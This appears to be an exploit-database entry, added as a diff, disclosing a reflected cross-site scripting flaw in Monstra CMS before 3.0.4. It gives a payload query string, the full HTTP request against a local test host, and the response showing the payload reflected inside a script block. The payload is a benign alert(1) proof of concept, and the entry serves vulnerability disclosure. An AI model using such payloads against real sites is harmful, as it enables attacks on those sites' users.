@@ -1,0 +1,48 @@
+# Exploit Title: Monstra CMS 3.0.4 - Cross-Site Scripting
+# Date: 2018-05-17
+# Exploit Author: Berk Dusunur
+# Vendor Homepage: https://monstra.org
+# Software Link: https://monstra.org
+# Version: before 3.0.4
+# Tested on: Pardus / Win10 AppServer
+
+# Proof Of Concept
+# Monstra is a modern and lightweight Content Management System.
+# Prints get request between script tags on page
+
+
+Payload ?vrk2f'-alert(1)-'ax8vv=1
+
+GET Request
+
+GET /test/monstra-3.0.4/?vrk2f'-alert(1)-'ax8vv=1 HTTP/1.1
+Host: 192.168.1.106
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response
+
+
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new
+Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js
+','_mga');
+
+_mga('create', '', 'auto');
+_mga('send', 'pageview', {
+'page': 'http://192.168.1.106/test/monstra-3.0.4/?vrk2f%27-alert(1',
+'title': ''
+});
+</script></body>
+
+
+http://localhost/test/monstra-3.0.4/?vrk2f'-alert(1)-'ax8vv=1
